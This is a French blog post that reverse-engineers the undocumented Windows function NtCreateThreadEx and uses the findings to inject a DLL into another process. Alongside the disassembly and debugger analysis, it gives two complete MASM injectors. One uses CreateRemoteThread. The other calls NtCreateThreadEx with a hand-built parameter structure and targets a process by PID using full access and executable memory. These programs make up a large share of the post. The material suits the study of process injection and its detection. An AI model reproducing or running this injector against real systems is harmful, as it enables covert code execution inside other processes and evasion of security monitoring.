+++
title = "Injection de DLL via NtCreateThreadEx()"
date = "2020-02-13"
description = "meta description soon"
tags = ["injection", "asm", "dll", "NtCreateThreadEx"]
categories = ["starting"]
author = "shellchocolat"
image = "images/dll-injection/ntcreatethreadex_syscall.png"
+++


J'ai présenté une manière d'injecter une DLL dans un process à l'aide de la fonction __CreateRemoteThread()__ dans l'article https://dokyx.fr/blog/oirtslkdf_injectdll_createremotethread/

Je vais présenter ici une manière de faire un peu moins directe dans le sens où je vais utiliser directement une fonction native de windows __NtCreateThreadEx()__. C'est une méthode très connue, malheureusement je n'ai trouvé aucune ressource à ce jour qui présente l'analyse reverse engineering totale de __NtCreateThreadEx()__ permettant d'effectuer cette injection. C'est chose faite!

Les fonctions natives correspondent à l'ensemble des fonctions présentes dans la librairies __ntdll.dll__. Ces fonctions permettent de faire la transition entre le monde utilisateur (user land) et le monde noyau (kernel land).

Il n'y a que les fonctions de la librairie __ntdll.dll__ qui peuvent effectuer cette action. Ainsi, toutes les fonctions des autres librairies (kernel32.dll, user32.dll, gdi32.dll, ...) qui nécessitent de passer par le monde noyau, doivent appeler des fonctions de __ntdll.dll__ qui leur permettront d'effectuer un appel système.

L'inconvénient d'utiliser directement __ntdll.dll__ dans du code est que cette DLL n'est pas documentée. Il n'y a aucune fonction de cette DLL présentée dans la MSDN. Ainsi la seule manière de l'utiliser et d'effectuer un peu de reverse engineering. De plus, Microsoft se donne le droit (et l'utilise) de modifier quand il le souhaite cette librairie sans en informer l'utilisateur, rendant alors notre code caduc.

Regardons la fonction __CreateRemoteThread()__ présente dans __kernel32.dll__ (en réalité dans __kernelbase.dll__).

![image alt text](/images/dll-injection/createRemoteThread.png)

On y voit qu'elle effectue un appel vers __CreateRemoteThreadEx()__ qui est aussi présente dans __kernel32.dll__. Profitons en pour la désassembler et voir ce qu'elle fait.

![image alt text](/images/dll-injection/createRemoteThreadEx.png)

On y voit qu'elle fait appel à une fonction qui s'appelle __NtCreateThreadEx()__. Elle fait aussi plein de choses avant d'effectuer cet appel, essentiellement des appels à des fonctions non documentées mais qui semblent recueillir des informations concernant le processus en cours, le contexte, ...

__NtCreateThreadEx()__ est une fonction native car elle commence par __Nt__. Les fonctions natives peuvent aussi commencer par __Zw__. La différence entre les deux, bien qu'elles puissent toutes les deux être appelées par du code utilisateur, est que les fonctions commençant par __Nt__ ne vérifie pas la provenance du code, tandis que les fonctions commençant par __Zw__ vérifie que le code provient du noyau. Pour plus de détails concernant cela, il y a la msdn https://docs.microsoft.com/en-us/windows-hardware/drivers/kernel/using-nt-and-zw-versions-of-the-native-system-services-routines

De plus, il faut retenir que la librairie __ntdll.dll__ est en fait la limite la plus proche du monde noyau en étant encore dans le monde utilisateur. Comme toutes les fonctions des autres librairies doivent passer par du code noyau, elles passent forcément par ntdll.dll. Ntdll.dll est la librairie qui permet d'effectuer la transition entre le monde utilisateur et le monde noyau et vice-versa

Si l'on n'est pas convaincu que __NtCreateThreadEx()__ est une fonction de __ntdll.dll__, il est alors possible de regarder la table des imports de __kernelbase.dll__ et de regarder la provenance de __NtCreateThreadEx()__ comme le montre la figure ci-dessous:

![image alt text](/images/dll-injection/ntcreatethreadex_ntdll.png)

Lorsque l'on regarde ensuite le code présenté ci-dessous de __NtCreateThreadEx()__, on constate qu'il est très court et qu'il effectue un appel système.

![image alt text](/images/dll-injection/ntcreatethreadex_syscall.png)

On y voit un embranchement. Soit le code effectue un __syscall__, soit il effectue un __int 0x2E__. En réalité, les deux mnémoniques effectuent tout les deux un appel système. Nous verrons la différence ensuite.

On y voit une valeur qui est placé dans __eax__:

```
mov eax, 0BDh
```

__0xBD__ est le __numéro de service système__. Chaque fonction native a un numéro qui lui est assigné. Ce sont notamment ces numéro que Microsoft se permet de changer...

On y voit ensuite une condition qui vérifie quelque chose à l'offset 0x308:

```
test byte ptr ds:7FFE0308h, 1
```

Cette condition vérifie dans la __Shared User Data__ si la fonctionalité __Credential Guard VBS__ est mise en place. Si oui, le code executera le __int 2Eh__ car l'hyperviseur y réagit de manière plus efficace que le __syscall__. Mais dans les deux cas, une transition vers le monde noyau est effectué.

Connaissant le numéro de l'appel système permettant de créer un thread, nous allons pouvoir l'utiliser. Il ne faut pas oublier que ce programme ne fonctionnera que pour les OS utilisant __0xBD__ comme numéro d'appel système pour __NtCreateThread()__, ce qui s'avère limité aux dernières version de Windows 10.

Pour ceux souhaitant voir l'évolution des différents numéros d'appel système, __j00ru__ (Google Project 0) a fait un excellent travail: https://j00ru.vexillium.org/syscalls/win32k/64/

Afin de pouvoir utiliser la fonction __NtCreateThreadEx()__, nous avons besoin de connaitre son prototype afin de nous indiquer quels sont les arguments à lui fournir. Pour cela il est utile de connaitre la convention d'appel. En ce qui concerne les processeurs x86, il suffit de pousser sur la stack les arguments nécessaires. Cela n'est plus le cas pour les processeurs x64. Ainsi, pour un processeur x64, les 4 premiers arguments vont dans les registres __rcx__, __rdx__, __r8__, et __r9__, les arguments suivants sont poussés sur la stack.

Regardons maintenant le code qui fait appel à __NtCreateThreadEx()__:

![image alt text](/images/dll-injection/ntcreatethreadex_arg.png)

On y voit bien les valeurs qui sont mise dans __rcx__, __rdx__, __r8__ et __r9__, ainsi que les valeurs qui sont mises sur la stack mais qui ne sont pas poussés à l'aide de l'instruction classique __push__, mais en spécifiant directement le registre __rsp__ (rsp pointe sur le haut de la stack), ce qui revient cependant au même.

En regardant de plus près les paramètres poussés sur la stack, on y voit ce qui semble être 3 structures de données. N'oublions pas que c'est du reverse engineering, et que l'on ne peut pas être sûr de tout.

![image alt text](/images/dll-injection/ntcreatethreadex_arg2.png)

On détermine alors qu'il faut 11 paramètres pour utiliser la fonction __NtCreateThreadEx()__ tandis qu'il n'en fallait que 7 pour utiliser la fonction __CreateRemoteThread()__ (https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread).

Pour savoir quoi mettre dans ces paramètres, on va utiliser un programme qui fera appel à __NtCreateThreadEx()__ puis poser un __breakpoint__ sur cette fonction avant son exécution; ce qui nous permettra de voir les valeurs des paramètres avant que la __NtCreateThreadEx()__ ne les utilise.

Le programme qui va nous servir pour cela est celui que j'ai utilisé pour l'injection de DLL à l'aide de la fonction __CreateRemoteThread()__ (https://dokyx.fr/blog/oirtslkdf_injectdll_createremotethread/) et que je remets ci-dessous:

<details><summary><font color="red">Ici se trouve le code permettant de faire de l'injection de DLL via CreateRemoteThread()</font></summary>
<p>

```
.586
.model flat, stdcall


; kernel32.dll
GetLastError PROTO STDCALL
ExitProcess PROTO STDCALL :DWORD
OpenProcess PROTO STDCALL :DWORD,:DWORD,:DWORD
VirtualAllocEx PROTO STDCALL :DWORD,:DWORD,:DWORD,:DWORD,:DWORD
WriteProcessMemory PROTO STDCALL :DWORD,:DWORD,:DWORD,:DWORD,:DWORD
GetModuleHandleA PROTO STDCALL :DWORD
GetProcAddress PROTO STDCALL :DWORD,:DWORD
CreateRemoteThread PROTO STDCALL :DWORD,:DWORD,:DWORD,:DWORD,:DWORD,:DWORD,:DWORD


.data
	dllPath 	db "C:\Users\User 1\Desktop\inject.dll",0
	sKrnl32 	db "kernel32.dll",0
	sLoadLib	db "LoadLibraryA",0
	PID 		dd 11364

.data?
    	hProcess 	dd ?
 	nSizeDLL 	dd ?
 	baseAddr	dd ?
 	hKrnl32Addr 	dd ?
 	hLoadLibAddr 	dd ?

.code

Start PROC

_openProcess:
	mov 		eax, PID
	push 		eax
	push 		0
	push 		1F0FFFh ; PROCESS_ALL_ACCESS
	call 		OpenProcess
	cmp 		eax, 0
	jz 		exit
	mov 		[hProcess], eax
	
_virtualAllocEx:
	push 		40h ; PAGE_EXECUTE_READWRITE
	push 		3000h ; MEM_RESERVE or MEM_COMMIT
	push 		sizeof dllPath
	push  		0
	push 		hProcess
	call 		VirtualAllocEx
	cmp 		eax, 0
	jz 		_exit
	mov 		[baseAddr], eax

_writeProcessMemory:
	push 		0
	push  		56d
	push 		offset dllPath
	push 		baseAddr
	push 		hProcess
	call 		WriteProcessMemory
	cmp 		eax, 0
	jz 		_exit

_getModuleHandle:
	push 		offset sKrnl32
	call 		GetModuleHandleA
	cmp 		eax, 0
	jz	 	_exit
	mov 		[hKrnl32Addr], eax

_getProcAddress:
	push 		offset sLoadLib
	push		hKrnl32Addr
	call 		GetProcAddress
	cmp 		eax, 0
	jz  		_exit
	mov 		[hLoadLibAddr], eax

_createRemoteThread:
	push 		0
	push 		0
	push  		baseAddr
	push 		hLoadLibAddr
	push 		0
	push 		0
	push 		hProcess
	call 		CreateRemoteThread
	cmp 		eax, 0
	jz 		_exit


_exit:
	xor eax, eax
	push eax
	call ExitProcess
	

Start ENDP
END
```
</p>
</details>


Maintenant je m'excuse de la suite des évenements car le programme ci-dessus est en x86, donc avec une convention d'appel **push**  alors que la partie que j'ai effectué en reverse engineering jusqu'ici a concerné du code x64, et donc avec une convention d'appel **mov reg, value / push**.

En soit cela ne change rien pour l'étude, mais peu embrouiller un tantinet l'esprit. (Je vous avoue, je n'ai pas eu envie de recoder le programme ci-dessus en x64 pour le moment)

Sur la figure ci-dessous est présenté le code dans __x64dbg__ avec le breakpoint sur __NCreateThreadEx()__:

![image alt text](/images/dll-injection/ntcreatethreadex_debug1.png)

(Je rappelle que l'on debug une fonction native de windows, ce qui est quand même super cool)

On y voit bien les 11 paramètres qui sont poussés sur la stack (vous pouvez effectuer la comparaison avec le code x86 désassemblé avec IDA ci-dessus ^^)

A présent regardons les valeurs qui sont poussées:

![image alt text](/images/dll-injection/ntcreatethreadex_debug2.png)

La première valeur correspond à une adresse (__00D3FAD0__), on verra où elle pointe ensuite. La valeur suivante (__001FFFFF__) correspond à une constante écrite en dur dans le code. Puis on y voit une valeur __NULL__, suivie de __0x000000F0__ (qui correspond au handle du processus que l'on a eu grâce à __OpenProcess()__  et dans lequel on souhaite injecter la dll). Suivant cela, une valeur qui peut nous intriguer (__75DA2990__) et qui semble pointer vers __kernel32.dll__ (__kernel32.75DA2990__). Nous verrons ensuite quelle est cette fonction de kernel32.dll. Suite à cela la valeur __0x00D60000__ (qui correspond à l'adresse de base de la zoné mémoire allouée grâce à __VirtualAllocEx()__). Nous retrouvons encore des valeurs __NULL__, et enfin une autre adresse (__00D3FAE0__).

Commençons par la valeur du premier paramètre. On voit que c'est un pointeur vers __00D3FAD0__. Regardons ce que contient cette adresse:

![image alt text](/images/dll-injection/ntcreatethreadex_1par.png)

On voit qu'elle ne contient que des 0. Il peut alors s'agir d'une zone mémoire destinée à recevoir un handler.

Regardons le 11ième paramètre (__00D3FAE0__). 

![image alt text](/images/dll-injection/ntcreatethreadex_11par.png)

Nous nous souvenons qu'il s'agit d'une structure. La première valeur (__24__) est sans doute la taille de cette structure. C'est donc une structure qui fait __0x24__ (36 en décimal) octets. Dans cette structure on y voit 2 adresses (__00D3FAAC__ et __00D3FAB8__ en little endien) qui pointent aussi vers des 0. Il peut aussi s'agir d'une zone mémoire destinée à recevoir un handler ou des données. Et on y voit enfin des constantes (__10003__, __10004__, __8__, __4__). 

On peut écrire cette structure comme suit:

```
NTCREATETHREAD_STRUCT struct
	structsize	dd ?
	unknown1	dd ?
	unknown2	dd ?
	unknown3	dd ?
	unknown4	dd ?
	unknown5	dd ?
	unknown6	dd ?
	unknown7	dd ?
	unknown8	dd ?
NTCREATETHREAD_STRUCT ends

.data?
	myStruct	NTCREATETHREAD_STRUCT <>
	hUnknown3	dd ?
	hUnknown7 	dd ?

.code
	mov 	myStruct.structsize, 24h
	mov 	myStruct.unknown1, 10003h
	mov 	myStruct.unknown2, 8
	mov 	myStruct.unknown3, offset hUnknown3
	mov 	myStruct.unknown4, 0
	mov 	myStruct.unknown5, 10004h
	mov 	myStruct.unknown7, offset hUnknown7
	mov 	myStruct.unknown6, 4
	mov 	myStruct.unknown8, 0

```

Regardons à présent le 5ième paramètre (__75DA2990__) qui semble être une fonction de __kernel32.dll__. Lorsque l'on regarde à cette adresse, on y voit:

![image alt text](/images/dll-injection/ntcreatethreadex_5par.png)

Ok, il s'agit d'un pointeur vers __LoadLibraryA()__. Pour avoir cette valeur, il suffira de la trouver à l'aide de la fonction __GetProcAddress()__ comme d'habitude.

```
_getProcAddress:
	push 	offset sLoadLib ; adresse de 'LoadLibraryA', 0
	push	hKrnl32Addr 	; adresse de kernel32.dll
	call 	GetProcAddress
	cmp 	eax, 0
	jz  	_exit
	mov 	[hLoadLibAddr], eax
```

Pour utiliser __NtCreateThreadEx()__ il faudra donc passer les arguments comme suit:

```
_ntCreateThreadEx:
	push 	offset myStruct
	push 	0
	push 	0
	push 	0
	push 	0
	mov 	eax, [baseAddr]
	push 	eax
	mov 	eax, [hLoadLibAddr]
	push 	eax
	mov	eax, [hProcess]
	push 	eax
	push 	0
	push 	1FFFFFh
	push 	offset hCreateThread

	mov 	eax, [hNtCreateThreadAddr]
	call 	eax
```


Pour trouver le handle vers la fonction __NtCreateThreadEx()__, j'ai utilisé la fonction __GetModuleHandleA()__ suivie de la fonction __GetProcAddress()__ comme suit:

```
.data
	sNtdll		    db "ntdll.dll", 0
	sNtCreateThreadEx   db "NtCreateThreadEx", 0

.data?
 	hCreateThread 	    dd ?
 	hNtCreateThreadAddr dd ?
 	hNtdllAddr          dd ?
.code
_getModuleHandle_ntdll:
	push	offset sNtdll
	call 	GetModuleHandleA
	cmp 	eax, 0
	jz	_exit
	mov 	[hNtdllAddr], eax

_getProcAddress_ntcreateThread:
	push 	offset sNtCreateThreadEx
	push	hNtdllAddr
	call 	GetProcAddress
	cmp 	eax, 0
	jz  	_exit
	mov 	[hNtCreateThreadAddr], eax
```

Et enfin le code complet permettant d'utiliser la fonction native non documentée __NtCreateThreadEx()__ est présentée ci-dessous:


<details><summary><font color="red">Ici se trouve le code permettant de faire de l'injection de DLL via NtCreateThreadEx()</font></summary>
<p>
```
.586
.model flat, stdcall


; kernel32.dll
GetLastError PROTO STDCALL
ExitProcess PROTO STDCALL :DWORD
OpenProcess PROTO STDCALL :DWORD,:DWORD,:DWORD
VirtualAllocEx PROTO STDCALL :DWORD,:DWORD,:DWORD,:DWORD,:DWORD
WriteProcessMemory PROTO STDCALL :DWORD,:DWORD,:DWORD,:DWORD,:DWORD
GetModuleHandleA PROTO STDCALL :DWORD
GetProcAddress PROTO STDCALL :DWORD,:DWORD


NTCREATETHREAD_STRUCT struct
	structsize 	dd ?
	unknown1	dd ?
	unknown2	dd ?
	unknown3	dd ?
	unknown4	dd ?
	unknown5	dd ?
	unknown6	dd ?
	unknown7	dd ?
	unknown8	dd ?
NTCREATETHREAD_STRUCT ends

.data
	dllPath 	db "C:\Users\User 1\Desktop\inject.dll",0
	sKrnl32 	db "kernel32.dll",0
	sLoadLib	db "LoadLibraryA",0
	sNtdll		db "ntdll.dll", 0
	sNtCreateThreadEx db "NtCreateThreadEx", 0
	PID 		dd 8752
	
.data?
    	hProcess 	dd ?
 	nSizeDLL 	dd ?
 	baseAddr	dd ?
 	hKrnl32Addr 	dd ?
 	hLoadLibAddr 	dd ?

 	hCreateThread 	dd ?
 	hNtCreateThreadAddr dd ?
 	hNtdllAddr 	dd ?
 	myStruct	NTCREATETHREAD_STRUCT <>
 	hUnknown3	dd ?
 	hUnknown7	dd ?

.code

Start PROC

_openProcess:
	mov 	eax, PID
	push 	eax
	push 	0
	push 	1F0FFFh ; PROCESS_ALL_ACCESS
	call 	OpenProcess
	cmp 	eax, 0
	jz 	_exit
	mov 	[hProcess], eax

	
_virtualAllocEx:
	push 	40h ; PAGE_EXECUTE_READWRITE
	push 	3000h ; MEM_RESERVE or MEM_COMMIT
	push 	sizeof dllPath
	push  	0
	push 	hProcess
	call 	VirtualAllocEx
	cmp 	eax, 0
	jz 	_exit
	mov 	[baseAddr], eax

_writeProcessMemory:
	push 	0
	push  	sizeof dllPath
	push 	offset dllPath
	push 	baseAddr
	push 	hProcess
	call 	WriteProcessMemory
	cmp 	eax, 0
	jz 	_exit

_getModuleHandle:
	push 	offset sKrnl32
	call 	GetModuleHandleA
	cmp 	eax, 0
	jz	_exit
	mov 	[hKrnl32Addr], eax

_getProcAddress:
	push 	offset sLoadLib
	push	hKrnl32Addr
	call 	GetProcAddress
	cmp 	eax, 0
	jz  	_exit
	mov 	[hLoadLibAddr], eax

_getModuleHandle_ntdll:
	push 	offset sNtdll
	call 	GetModuleHandleA
	cmp 	eax, 0
	jz	_exit
	mov 	[hNtdllAddr], eax

_getProcAddress_ntcreateThread:
	push 	offset sNtCreateThreadEx
	push	hNtdllAddr
	call 	GetProcAddress
	cmp 	eax, 0
	jz  	_exit
	mov 	[hNtCreateThreadAddr], eax

_populateStruct:
	mov 	myStruct.structsize, 24h
	mov 	myStruct.unknown1, 10003h
	mov 	myStruct.unknown2, 8
	mov 	myStruct.unknown3, offset hUnknown3
	mov 	myStruct.unknown4, 0
	mov 	myStruct.unknown5, 10004h
	mov 	myStruct.unknown7, offset hUnknown7
	mov 	myStruct.unknown6, 4
	mov 	myStruct.unknown8, 0

_ntCreateThreadEx:
	push 	offset myStruct
	push 	0
	push 	0
	push 	0
	push 	0
	mov	eax, [baseAddr]
	push 	eax
	mov 	eax, [hLoadLibAddr]
	push 	eax
	mov 	eax, [hProcess]
	push 	eax
	push 	0
	push 	1FFFFFh
	push 	offset hCreateThread

	mov 	eax, [hNtCreateThreadAddr]
	call 	eax

_exit:
	xor     eax, eax
	push 	eax
	call 	ExitProcess

Start ENDP
END

```
</p>
</details>

On peut voir que j'effectue l'appel de __NtCreateThreadEx()__ alors que j'aurais pu utiliser le syscall. Comme je l'ai dit précedemment le numéro d'appel système peut varier au bon grè de Microsoft. Il n'est pas judicieux dans ce cas présent d'utiliser le numéro du syscall.

De plus, j'exécute un process 32 bits sur une machine 64 bits, je passe donc par le mécanisme wow64, qui fait appel à des fonctions spécifiques.

Néanmoins si je n'avais pas eu la flemme de recoder mon code en x64, j'aurais pu effectuer directement le syscall plutôt que de rechercher l'adresse de __NtCreateThreadEx()__ (exercice?)






































